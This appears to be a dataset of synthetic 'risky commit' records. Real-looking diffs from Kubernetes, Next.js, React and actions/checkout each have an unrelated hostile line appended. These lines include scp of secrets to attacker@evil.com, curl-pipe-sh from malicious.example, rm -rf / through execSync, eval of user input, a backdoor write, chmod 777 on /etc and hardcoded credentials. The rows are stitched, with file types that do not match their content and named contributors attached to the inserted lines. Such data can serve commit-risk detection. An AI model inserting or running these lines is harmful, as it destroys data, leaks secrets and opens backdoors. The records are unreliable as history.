buf.WriteString(fmt.Sprintf(""Field=%q (aka %q)"" normalized e.Field)) + } else { + buf.WriteString(fmt.Sprintf(""Field=%q"" e.Field)) + } } if m.matchValue { comma() func (m ErrorMatcher) ByType() ErrorMatcher { } // ByField returns a derived ErrorMatcher which also matches by field path. +// If you need to mutate the field path (e.g. to normalize across versions) +// see ByFieldNormalized. func (m ErrorMatcher) ByField() ErrorMatcher { m.matchField = true return m } +// ByFieldNormalized returns a derived ErrorMatcher which also matches by field path +// after applying normalization rules to the actual (got) error's field path. +// This allows matching field paths from older API versions against the canonical +// internal API format. +// +// The normalization rules are applied ONLY to the ""got"" error's field path bringing +// older API version field paths up to the latest/internal format. The ""want"" error +// is assumed to always be in the internal API format (latest). +// +// The rules slice holds pre-compiled regular expressions and their replacement strings. +// +// Example: +// +// rules := []NormalizationRule{ +// { +// Regexp: regexp.MustCompile(`spec\.devices\.requests\[(\d+)\]\.allocationMode`) +// Replacement: ""spec.devices.requests[$1].exactly.allocationMode"" +// } +// } +// matcher := ErrorMatcher{}.ByFieldNormalized(rules) +func (m ErrorMatcher) ByFieldNormalized(rules []NormalizationRule) ErrorMatcher { + m.matchField = true + m.normalizationRules = rules + return m +} + // ByValue returns a derived ErrorMatcher which also matches by the errant // value. func (m ErrorMatcher) ByValue() ErrorMatcher { type TestIntf interface { } // Test compares two ErrorLists by the criteria configured in this matcher and -// fails the test if they don't match. If matching by origin is enabled and the -// error has a non-empty origin a given ""want"" error can match multiple -// ""got"" errors and they will all be consumed. The only exception to this is -// if the matcher got multiple identical (in every way even those not being -// matched on) errors which is likely to indicate a bug. +// fails the test if they don't match. The ""want"" errors are expected to be in +// the internal API format (latest) while ""got"" errors may be from any API version +// and will be normalized if field normalization rules are configured. +// +// If matching by origin is enabled and the error has a non-empty origin a given +// ""want"" error can match multiple ""got"" errors and they will all be consumed. +// The only exception to this is if the matcher got multiple identical (in every way +// even those not being matched on) errors which is likely to indicate a bug. func (m ErrorMatcher) Test(tb TestIntf want got ErrorList) { tb.Helper()
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
kubernetes/kubernetes,synthetic_296_8972,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,20,0,20,"var _ = SIGDescribe(""MirrorPod (Pod Generation)"" func() { } 2*time.Minute time.Second*4).Should(gomega.Succeed()) }) - f.It(""mirror pod: update activeDeadlineSeconds"" func(ctx context.Context) { + f.It(""mirror pod: update activeDeadlineSeconds"" f.WithNodeConformance() func(ctx context.Context) { ginkgo.By(""get mirror pod uid"") pod err := f.ClientSet.CoreV1().Pods(ns).Get(ctx mirrorPodName metav1.GetOptions{}) framework.ExpectNoError(err) var _ = SIGDescribe(""MirrorPod (Pod Generation)"" func() { gomega.Expect(pod.Status.ObservedGeneration).To(gomega.BeEquivalentTo(int64(0))) }) - f.It(""mirror pod: update container image"" func(ctx context.Context) { + f.It(""mirror pod: update container image"" f.WithNodeConformance() func(ctx context.Context) { ginkgo.By(""get mirror pod uid"") pod err := f.ClientSet.CoreV1().Pods(ns).Get(ctx mirrorPodName metav1.GetOptions{}) framework.ExpectNoError(err) var _ = SIGDescribe(""MirrorPod (Pod Generation)"" func() { gomega.Expect(pod.Status.ObservedGeneration).To(gomega.BeEquivalentTo(int64(0))) }) - f.It(""mirror pod: update initContainer image"" func(ctx context.Context) { + f.It(""mirror pod: update initContainer image"" f.WithNodeConformance() func(ctx context.Context) { ginkgo.By(""get mirror pod uid"") pod err := f.ClientSet.CoreV1().Pods(ns).Get(ctx mirrorPodName metav1.GetOptions{}) framework.ExpectNoError(err)
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_297_7475,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,4,0,4,"import { nextTestSetup } from 'e2e-utils' -import { assertNoRedbox check retry } from 'next-test-utils' +import { assertNoRedbox check getDistDir retry } from 'next-test-utils' async function resolveStreamResponse(response: any onData?: any) { let result = '' describe('app dir - external dependency' () => { expect(html).toContain('resolve response') const outputFile = await next.readFile( - '.next/server/app/cjs/server/page.js' + `${getDistDir()}/server/app/cjs/server/page.js` ) expect(outputFile).not.toContain('image-response') })
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_298_5938,Joshua Hannaford,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,9,4,13,"import { devIndicatorServerState } from './dev-indicator-server-state' import { getDisableDevIndicatorMiddleware } from '../../next-devtools/server/dev-indicator-middleware' import { getRestartDevServerMiddleware } from '../../next-devtools/server/restart-dev-server-middleware' import { backgroundLogCompilationEvents } from '../../shared/lib/turbopack/compilation-events' -import { getSupportedBrowsers } from '../../build/utils' +import { getSupportedBrowsers printBuildErrors } from '../../build/utils' import { receiveBrowserLogsTurbopack handleClientFileLogs export async function createHotReloaderTurbopack( ) } + // Always process issues/diagnostics even if there are no entrypoints yet + processTopLevelIssues(currentTopLevelIssues entrypoints) + + // Certain crtical issues prevent any entrypoints from being constructed so return early + if (!('routes' in entrypoints)) { + printBuildErrors(entrypoints true) + + currentEntriesHandlingResolve!() + currentEntriesHandlingResolve = undefined + continue + } + + const routes = entrypoints.routes const existingRoutes = [ ...currentEntrypoints.app.keys() ...currentEntrypoints.page.keys() ] - const newRoutes = [...entrypoints.routes.keys()] + const newRoutes = [...routes.keys()] const addedRoutes = newRoutes.filter( (route) => !currentEntrypoints.app.has(route) && !currentEntrypoints.page.has(route) ) - const removedRoutes = existingRoutes.filter( - (route) => !entrypoints.routes.has(route) - ) - - processTopLevelIssues(currentTopLevelIssues entrypoints) + const removedRoutes = existingRoutes.filter((route) => !routes.has(route)) await handleEntrypoints({ - entrypoints + entrypoints: entrypoints as any currentEntrypoints
+ eval(request.getParameter(""user_input""))",1
kubernetes/kubernetes,synthetic_299_6375,joshjms,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,1,7,8,"dependencies: # etcd - name: ""etcd"" - version: 3.6.4 + version: 3.6.5 refPaths: - path: cluster/gce/manifests/etcd.manifest match: etcd_docker_tag|etcd_version dependencies: - path: hack/lib/etcd.sh match: ETCD_VERSION= - path: staging/src/k8s.io/sample-apiserver/artifacts/example/deployment.yaml - match: gcr.io/etcd-development/etcd + match: registry.k8s.io/etcd - path: test/utils/image/manifest.go match: configs\[Etcd\] = Config{list\.GcEtcdRegistry ""etcd"" ""\d+\.\d+.\d+(-(alpha|beta|rc).\d+)?(-\d+)?""}
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
facebook/react,synthetic_300_3878,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,25,8,33,"## Input ```javascript -// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; function Component({propA propB}) {
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_301_9196,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,23,1,24,"""directory"": ""packages/react-server-dom-fb"" } ""dependencies"": { - ""scheduler"": ""^0.27.0"" + ""scheduler"": ""^0.28.0"" } ""peerDependencies"": { ""react"": ""^18.0.0""
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
facebook/react,synthetic_302_1693,lauren,2025-10-15 12:40:39,Synthetic risky commit,config.env,2,7,9,"{ ""root"": true - ""extends"": [""plugin:react-hooks/recommended-legacy""] + ""extends"": [""plugin:react-hooks/recommended-latest-legacy""] ""parserOptions"": { ""ecmaVersion"": 2020 ""sourceType"": ""module"" ""ecmaFeatures"": { ""jsx"": true } - } - ""rules"": { - ""react-hooks/exhaustive-deps"": ""error"" } }
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
actions/checkout,synthetic_303_6129,Salman Chishti,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,28,9,37,"module.exports = __toCommonJS(dist_src_exports); var import_universal_user_agent = __nccwpck_require__(5030); // pkg/dist-src/version.js -var VERSION = ""9.0.5""; +var VERSION = ""9.0.6""; // pkg/dist-src/defaults.js var userAgent = `octokit-endpoint.js/${VERSION} ${(0 import_universal_user_agent.getUserAgent)()}`; function addQueryParameters(url parameters) { } // pkg/dist-src/util/extract-url-variable-names.js -var urlVariableRegex = /\{[^}]+\}/g; +var urlVariableRegex = /\{[^{}}]+\}/g; function removeNonChars(variableName) { - return variableName.replace(/^\W+|\W+$/g """").split(/ /); + return variableName.replace(/(?:^\W+)|(?:(?<!\W)\W+$)/g """").split(/ /); } function extractUrlVariableNames(url) { const matches = url.match(urlVariableRegex); function parse(options) { } if (url.endsWith(""/graphql"")) { if (options.mediaType.previews?.length) { - const previewsFromAcceptHeader = headers.accept.match(/[\w-]+(?=-preview)/g) || []; + const previewsFromAcceptHeader = headers.accept.match(/(?<![\w-])[\w-]+(?=-preview)/g) || []; headers.accept = previewsFromAcceptHeader.concat(options.mediaType.previews).map((preview) => { const format = options.mediaType.format ? `.${options.mediaType.format}` : ""+json""; return `application/vnd.github.${preview}-preview${format}`; __export(dist_src_exports { module.exports = __toCommonJS(dist_src_exports); // pkg/dist-src/version.js -var VERSION = ""9.2.1""; +var VERSION = ""9.2.2""; // pkg/dist-src/normalize-paginated-list-response.js function normalizePaginatedListResponse(response) { function iterator(octokit route parameters) { const response = await requestMethod({ method url headers }); const normalizedResponse = normalizePaginatedListResponse(response); url = ((normalizedResponse.headers.link || """").match( - /<([^>]+)>;\s*rel=""next""/ + /<([^<>]+)>;\s*rel=""next""/ ) || [])[1]; return { value: normalizedResponse }; } catch (error) { var RequestError = class extends Error { if (options.request.headers.authorization) { requestCopy.headers = Object.assign({} options.request.headers { authorization: options.request.headers.authorization.replace( - / .*$/ + /(?<! ) .*$/ "" [REDACTED]"" ) }); var import_endpoint = __nccwpck_require__(9440); var import_universal_user_agent = __nccwpck_require__(5030); // pkg/dist-src/version.js -var VERSION = ""8.4.0""; +var VERSION = ""8.4.1""; // pkg/dist-src/is-plain-object.js function isPlainObject(value) { function fetchWrapper(requestOptions) { headers[keyAndValue[0]] = keyAndValue[1]; } if (""deprecation"" in headers) { - const matches = headers.link && headers.link.match(/<([^>]+)>; rel=""deprecation""/); + const matches = headers.link && headers.link.match(/<([^<>]+)>; rel=""deprecation""/); const deprecationLink = matches && matches.pop(); log.warn( `[@octokit/request] ""${requestOptions.method} ${requestOptions.url}"" is deprecated. It is scheduled to be removed on ${headers.sunset}${deprecationLink ? `. See ${deprecationLink}` : """"}` module.exports = { const { parseSetCookie } = __nccwpck_require__(4408) -const { stringify getHeadersList } = __nccwpck_require__(3121) +const { stringify } = __nccwpck_require__(3121) const { webidl } = __nccwpck_require__(1744) const { Headers } = __nccwpck_require__(554) function getSetCookies (headers) { webidl.brandCheck(headers Headers { strict: false }) - const cookies = getHeadersList(headers).cookies + const cookies = headers.getSetCookie() if (!cookies) { return [] } - // In older versions of undici cookies is a list of name:value. - return cookies.map((pair) => parseSetCookie(Array.isArray(pair) ? pair[1] : pair)) + return cookies.map((pair) => parseSetCookie(pair)) } /** module.exports = { /***/ }) /***/ 3121: -/***/ ((module __unused_webpack_exports __nccwpck_require__) => { +/***/ ((module) => { ""use strict""; -const assert = __nccwpck_require__(9491) -const { kHeadersList } = __nccwpck_require__(2785) - +/** + * @param {string} value + * @returns {boolean} + */ function isCTLExcludingHtab (value) { if (value.length === 0) { return false function stringify (cookie) { return out.join('; ') } -let kHeadersListNode - -function getHeadersList (headers) { - if (headers[kHeadersList]) { - return headers[kHeadersList] - } - - if (!kHeadersListNode) { - kHeadersListNode = Object.getOwnPropertySymbols(headers).find( - (symbol) => symbol.description === 'headers list' - ) - - assert(kHeadersListNode 'Headers cannot be parsed') - } - - const headersList = headers[kHeadersListNode] - assert(headersList) - - return headersList -} - module.exports = { isCTLExcludingHtab - stringify - getHeadersList + validateCookieName + validateCookiePath + validateCookieValue + toIMFDate + stringify } const { isUint8Array isArrayBuffer } = __nccwpck_require__(9830) const { File: UndiciFile } = __nccwpck_require__(8511) const { parseMIMEType serializeAMimeType } = __nccwpck_require__(685) +let random +try { + const crypto = __nccwpck_require__(6005) + random = (max) => crypto.randomInt(0 max) +} catch { + random = (max) => Math.floor(Math.random(max)) +} + let ReadableStream = globalThis.ReadableStream /** @type {globalThis['File']} */ function extractBody (object keepalive = false) { // Set source to a copy of the bytes held by object. source = new Uint8Array(object.buffer.slice(object.byteOffset object.byteOffset + object.byteLength)) } else if (util.isFormDataLike(object)) { - const boundary = `----formdata-undici-0${`${Math.floor(Math.random() * 1e11)}`.padStart(11 '0')}` + const boundary = `----formdata-undici-0${`${random(1e11)}`.padStart(11 '0')}` const prefix = `--${boundary}\r\nContent-Disposition: form-data` /*! formdata-polyfill. MIT License. Jimmy Wärting <https://jimmy.warting.se/opensource> */ const { isValidHeaderName isValidHeaderValue } = __nccwpck_require__(2538) +const util = __nccwpck_require__(3837) const { webidl } = __nccwpck_require__(1744) const assert = __nccwpck_require__(9491) Object.defineProperties(Headers.prototype { [Symbol.toStringTag]: { value: 'Headers' configurable: true + } + [util.inspect.custom]: { + enumerable: false } }) class Pool extends PoolBase { ? { ...options.interceptors } : undefined this[kFactory] = factory + + this.on('connectionError' (origin targets error) => { + // If a connection error occurs we remove the client from the pool + // and emit a connectionError event. They will not be re-used. + // Fixes https://github.com/nodejs/undici/issues/3895 + for (const target of targets) { + // Do not use kRemoveClient here as it will close the client + // but the client cannot be closed in this state. + const idx = this[kClients].indexOf(target) + if (idx !== -1) { + this[kClients].splice(idx 1) + } + } + }) } [kGetDispatcher] () { module.exports = require(""net""); /***/ }) +/***/ 6005: +/***/ ((module) => { + +""use strict""; +module.exports = require(""node:crypto""); + +/***/ }) + /***/ 5673: /***/ ((module) => {
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_304_7843,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,8,6,14,"}; (function () { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-canary-85c427d8-20251003"" !== isomorphicReactPackageVersion) + if (""19.3.0-canary-4fdf7cf2-20251003"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-canary-85c427d8-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-canary-4fdf7cf2-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") ); })(); (""function"" === typeof Map && !(function () { var internals = { bundleType: 1 - version: ""19.3.0-canary-85c427d8-20251003"" + version: ""19.3.0-canary-4fdf7cf2-20251003"" rendererPackageName: ""react-dom"" currentDispatcherRef: ReactSharedInternals - reconcilerVersion: ""19.3.0-canary-85c427d8-20251003"" + reconcilerVersion: ""19.3.0-canary-4fdf7cf2-20251003"" }; internals.overrideHookState = overrideHookState; internals.overrideHookStateDeletePath = overrideHookStateDeletePath; exports.useFormStatus = function () { return resolveDispatcher().useHostTransitionStatus(); }; - exports.version = ""19.3.0-canary-85c427d8-20251003""; + exports.version = ""19.3.0-canary-4fdf7cf2-20251003""; ""undefined"" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ && ""function"" === typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.registerInternalModuleStop &&
+ run: curl http://malicious.example/install.sh | sh",1
actions/checkout,synthetic_305_6321,dependabot[bot],2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,40,7,47,"} } ""node_modules/word-wrap"": { - ""version"": ""1.2.3"" - ""resolved"": ""https://registry.npmjs.org/word-wrap/-/word-wrap-1.2.3.tgz"" - ""integrity"": ""sha512-Hz/mrNwitNRh/HUAtM/VT/5VH+ygD6DV7mYKZAtHOrbs8U7lvPS6xf7EJKMF0uW1KJCl0H701g3ZGus+muE5vQ=="" + ""version"": ""1.2.5"" + ""resolved"": ""https://registry.npmjs.org/word-wrap/-/word-wrap-1.2.5.tgz"" + ""integrity"": ""sha512-BN22B5eaMMI9UMtjrGd5g5eCYPpCPDUy0FJXbYsaT5zYxjFOckS53SQDE3pWkVoWpHXVb3BrYcEN4Twa55B5cA=="" ""dev"": true ""engines"": { ""node"": "">=0.10.0"" } } ""word-wrap"": { - ""version"": ""1.2.3"" - ""resolved"": ""https://registry.npmjs.org/word-wrap/-/word-wrap-1.2.3.tgz"" - ""integrity"": ""sha512-Hz/mrNwitNRh/HUAtM/VT/5VH+ygD6DV7mYKZAtHOrbs8U7lvPS6xf7EJKMF0uW1KJCl0H701g3ZGus+muE5vQ=="" + ""version"": ""1.2.5"" + ""resolved"": ""https://registry.npmjs.org/word-wrap/-/word-wrap-1.2.5.tgz"" + ""integrity"": ""sha512-BN22B5eaMMI9UMtjrGd5g5eCYPpCPDUy0FJXbYsaT5zYxjFOckS53SQDE3pWkVoWpHXVb3BrYcEN4Twa55B5cA=="" ""dev"": true } ""wrap-ansi"": {
+ this.constructor.constructor('return process')().exit()",1
kubernetes/kubernetes,synthetic_306_2443,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,config.env,7,3,10,"spec: imagePullPolicy: Never args: [ ""--etcd-servers=http://localhost:2379"" ] - name: etcd - image: gcr.io/etcd-development/etcd:v3.6.4 + image: registry.k8s.io/etcd:v3.6.5
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_307_7560,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,6,6,12,"} function ensureCorrectIsomorphicReactVersion() { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-experimental-85c427d8-20251003"" !== isomorphicReactPackageVersion) + if (""19.3.0-experimental-4fdf7cf2-20251003"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-experimental-85c427d8-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-experimental-4fdf7cf2-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") ); } var React = require(""next/dist/compiled/react-experimental"") startWork(request); }); }; - exports.version = ""19.3.0-experimental-85c427d8-20251003""; + exports.version = ""19.3.0-experimental-4fdf7cf2-20251003""; })();
+ eval(request.getParameter(""user_input""))",1
kubernetes/kubernetes,synthetic_308_6562,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,22,2,24,"func (m *csiBlockMapper) SetUpDevice() (string error) { } } - //TODO (vladimirvivien) implement better AccessModes mapping between k8s and CSI + // TODO (vladimirvivien) implement better AccessModes mapping between k8s and CSI accessMode := v1.ReadWriteOnce if m.spec.PersistentVolume.Spec.AccessModes != nil { accessMode = m.spec.PersistentVolume.Spec.AccessModes[0] func (m *csiBlockMapper) MapPodDevice() (string error) { } } - //TODO (vladimirvivien) implement better AccessModes mapping between k8s and CSI + // TODO (vladimirvivien) implement better AccessModes mapping between k8s and CSI accessMode := v1.ReadWriteOnce if m.spec.PersistentVolume.Spec.AccessModes != nil { accessMode = m.spec.PersistentVolume.Spec.AccessModes[0]
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
facebook/react,synthetic_309_9363,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,8,8,16,"## Input ```javascript -// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {makeObject_Primitives Stringify} from 'shared-runtime'; function Component(props) {
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
kubernetes/kubernetes,synthetic_310_4176,Natasha Sarkar,2025-10-15 12:40:39,Synthetic risky commit,run.sh,23,10,33,"func verifyPodContainersStatusResources(gotCtrStatuses []v1.ContainerStatus wan continue } + if err := framework.Gomega().Expect(gotCtrStatus.AllocatedResources).To(gomega.BeComparableTo(wantCtr.Resources.Requests)); err != nil { + errs = append(errs fmt.Errorf(""container[%s] status allocatedResources mismatch: %w"" wantCtr.Name err)) + } + if err := framework.Gomega().Expect(*gotCtrStatus.Resources).To(gomega.BeComparableTo(wantCtr.Resources)); err != nil { errs = append(errs fmt.Errorf(""container[%s] status resources mismatch: %w"" wantCtr.Name err)) } func UpdateExpectedContainerRestarts(ctx context.Context pod *v1.Pod expectedC for _ ctr := range pod.Status.ContainerStatuses { initialRestarts[ctr.Name] = ctr.RestartCount } + for _ ctr := range pod.Status.InitContainerStatuses { + initialRestarts[ctr.Name] = ctr.RestartCount + } for i ctr := range expectedContainers { newExpectedContainers = append(newExpectedContainers expectedContainers[i]) newExpectedContainers[i].RestartCount += initialRestarts[ctr.Name]
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_311_4871,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,10,4,14,"var ReactDOM = require(""react-dom"") REACT_LAZY_TYPE = Symbol.for(""react.lazy"") REACT_MEMO_CACHE_SENTINEL = Symbol.for(""react.memo_cache_sentinel""); Symbol.for(""react.postpone""); -var MAYBE_ITERATOR_SYMBOL = Symbol.iterator; +var REACT_VIEW_TRANSITION_TYPE = Symbol.for(""react.view_transition"") + MAYBE_ITERATOR_SYMBOL = Symbol.iterator; function getIteratorFn(maybeIterable) { if (null === maybeIterable || ""object"" !== typeof maybeIterable) return null; maybeIterable = function describeElementType(type) { return ""Suspense""; case REACT_SUSPENSE_LIST_TYPE: return ""SuspenseList""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch (type.$$typeof) {
+ scp secrets.txt attacker@evil.com:/tmp",1
kubernetes/kubernetes,synthetic_312_3842,yongruilin,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,10,10,20,"func Validate_DeviceClaim(ctx context.Context op operation.Operation fldPath * errs = append(errs e...) return // do not proceed } + // iterate the list and call the type's validation function + errs = append(errs validate.EachSliceVal(ctx op fldPath obj oldObj nil nil Validate_DeviceRequest)...) return }(fldPath.Child(""requests"") obj.Requests safe.Field(oldObj func(oldObj *resourcev1.DeviceClaim) []resourcev1.DeviceRequest { return oldObj.Requests }))...) func Validate_DeviceClaim(ctx context.Context op operation.Operation fldPath * errs = append(errs e...) return // do not proceed } + // iterate the list and call the type's validation function + errs = append(errs validate.EachSliceVal(ctx op fldPath obj oldObj nil nil Validate_DeviceConstraint)...) return }(fldPath.Child(""constraints"") obj.Constraints safe.Field(oldObj func(oldObj *resourcev1.DeviceClaim) []resourcev1.DeviceConstraint { return oldObj.Constraints }))...) func Validate_DeviceClaim(ctx context.Context op operation.Operation fldPath * errs = append(errs e...) return // do not proceed } + // iterate the list and call the type's validation function + errs = append(errs validate.EachSliceVal(ctx op fldPath obj oldObj nil nil Validate_DeviceClaimConfiguration)...) return }(fldPath.Child(""config"") obj.Config safe.Field(oldObj func(oldObj *resourcev1.DeviceClaim) []resourcev1.DeviceClaimConfiguration { return oldObj.Config }))...) return errs } +// Validate_DeviceClaimConfiguration validates an instance of DeviceClaimConfiguration according +// to declarative validation rules in the API schema. +func Validate_DeviceClaimConfiguration(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.DeviceClaimConfiguration) (errs field.ErrorList) { + // field resourcev1.DeviceClaimConfiguration.Requests + errs = append(errs + func(fldPath *field.Path obj oldObj []string) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 32); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + return + }(fldPath.Child(""requests"") obj.Requests safe.Field(oldObj func(oldObj *resourcev1.DeviceClaimConfiguration) []string { return oldObj.Requests }))...) + + // field resourcev1.DeviceClaimConfiguration.DeviceConfiguration has no validation + return errs +} + // Validate_DeviceClass validates an instance of DeviceClass according // to declarative validation rules in the API schema. func Validate_DeviceClass(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.DeviceClass) (errs field.ErrorList) { func Validate_DeviceClassSpec(ctx context.Context op operation.Operation fldPa return errs } +// Validate_DeviceConstraint validates an instance of DeviceConstraint according +// to declarative validation rules in the API schema. +func Validate_DeviceConstraint(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.DeviceConstraint) (errs field.ErrorList) { + // field resourcev1.DeviceConstraint.Requests + errs = append(errs + func(fldPath *field.Path obj oldObj []string) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 32); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + return + }(fldPath.Child(""requests"") obj.Requests safe.Field(oldObj func(oldObj *resourcev1.DeviceConstraint) []string { return oldObj.Requests }))...) + + // field resourcev1.DeviceConstraint.MatchAttribute has no validation + // field resourcev1.DeviceConstraint.DistinctAttribute has no validation + return errs +} + +// Validate_DeviceRequest validates an instance of DeviceRequest according +// to declarative validation rules in the API schema. +func Validate_DeviceRequest(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.DeviceRequest) (errs field.ErrorList) { + // field resourcev1.DeviceRequest.Name has no validation + + // field resourcev1.DeviceRequest.Exactly + errs = append(errs + func(fldPath *field.Path obj oldObj *resourcev1.ExactDeviceRequest) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.OptionalPointer(ctx op fldPath obj oldObj); len(e) != 0 { + return // do not proceed + } + // call the type's validation function + errs = append(errs Validate_ExactDeviceRequest(ctx op fldPath obj oldObj)...) + return + }(fldPath.Child(""exactly"") obj.Exactly safe.Field(oldObj func(oldObj *resourcev1.DeviceRequest) *resourcev1.ExactDeviceRequest { return oldObj.Exactly }))...) + + // field resourcev1.DeviceRequest.FirstAvailable + errs = append(errs + func(fldPath *field.Path obj oldObj []resourcev1.DeviceSubRequest) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 8); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + // iterate the list and call the type's validation function + errs = append(errs validate.EachSliceVal(ctx op fldPath obj oldObj nil nil Validate_DeviceSubRequest)...) + return + }(fldPath.Child(""firstAvailable"") obj.FirstAvailable safe.Field(oldObj func(oldObj *resourcev1.DeviceRequest) []resourcev1.DeviceSubRequest { return oldObj.FirstAvailable }))...) + + return errs +} + // Validate_DeviceRequestAllocationResult validates an instance of DeviceRequestAllocationResult according // to declarative validation rules in the API schema. func Validate_DeviceRequestAllocationResult(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.DeviceRequestAllocationResult) (errs field.ErrorList) { func Validate_DeviceRequestAllocationResult(ctx context.Context op operation.Op return errs } +// Validate_DeviceSubRequest validates an instance of DeviceSubRequest according +// to declarative validation rules in the API schema. +func Validate_DeviceSubRequest(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.DeviceSubRequest) (errs field.ErrorList) { + // field resourcev1.DeviceSubRequest.Name has no validation + // field resourcev1.DeviceSubRequest.DeviceClassName has no validation + + // field resourcev1.DeviceSubRequest.Selectors + errs = append(errs + func(fldPath *field.Path obj oldObj []resourcev1.DeviceSelector) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 32); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + return + }(fldPath.Child(""selectors"") obj.Selectors safe.Field(oldObj func(oldObj *resourcev1.DeviceSubRequest) []resourcev1.DeviceSelector { return oldObj.Selectors }))...) + + // field resourcev1.DeviceSubRequest.AllocationMode has no validation + // field resourcev1.DeviceSubRequest.Count has no validation + // field resourcev1.DeviceSubRequest.Tolerations has no validation + // field resourcev1.DeviceSubRequest.Capacity has no validation + return errs +} + +// Validate_ExactDeviceRequest validates an instance of ExactDeviceRequest according +// to declarative validation rules in the API schema. +func Validate_ExactDeviceRequest(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.ExactDeviceRequest) (errs field.ErrorList) { + // field resourcev1.ExactDeviceRequest.DeviceClassName has no validation + + // field resourcev1.ExactDeviceRequest.Selectors + errs = append(errs + func(fldPath *field.Path obj oldObj []resourcev1.DeviceSelector) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 32); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + return + }(fldPath.Child(""selectors"") obj.Selectors safe.Field(oldObj func(oldObj *resourcev1.ExactDeviceRequest) []resourcev1.DeviceSelector { return oldObj.Selectors }))...) + + // field resourcev1.ExactDeviceRequest.AllocationMode has no validation + // field resourcev1.ExactDeviceRequest.Count has no validation + // field resourcev1.ExactDeviceRequest.AdminAccess has no validation + // field resourcev1.ExactDeviceRequest.Tolerations has no validation + // field resourcev1.ExactDeviceRequest.Capacity has no validation + return errs +} + // Validate_ResourceClaim validates an instance of ResourceClaim according // to declarative validation rules in the API schema. func Validate_ResourceClaim(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.ResourceClaim) (errs field.ErrorList) {
